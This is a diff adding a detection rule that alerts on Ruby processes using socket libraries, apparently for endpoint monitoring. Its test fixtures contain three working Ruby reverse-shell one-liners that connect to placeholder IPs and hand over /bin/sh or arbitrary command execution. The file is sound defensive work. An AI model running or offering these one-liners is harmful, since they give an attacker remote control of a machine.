@@ -1,0 +1,28 @@
+name: rta_ruby_socket_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "ruby" &&
+    (
+      re_match(e.process_args, "TCPSocket") ||
+      re_match(e.process_args, "Socket\\.tcp") ||
+      re_match(e.process_args, "require.*socket")
+    )
+  )
+tests:
+  - cleartext: "ruby TCPSocket reverse shell"
+    process_name: ruby
+    process_args: "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.10.10.10\",\"4444\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'"
+    should_match: true
+  - cleartext: "ruby Socket.tcp reverse shell"
+    process_name: ruby
+    process_args: "ruby -rsocket -e 's=Socket.tcp(\"192.168.1.1\",8080);s.puts(\"Connected\");exec(\"/bin/sh -i\")'"
+    should_match: true
+  - cleartext: "ruby spawn reverse shell"
+    process_name: ruby
+    process_args: "ruby -e 'require \"socket\";t=TCPSocket.new(\"10.0.0.1\",4444);spawn(\"/bin/sh\",[:out,:err]=>t)'"
+    should_match: true
+  - cleartext: "normal ruby script"
+    process_name: ruby
+    process_args: "ruby main.rb"
+    should_match: false
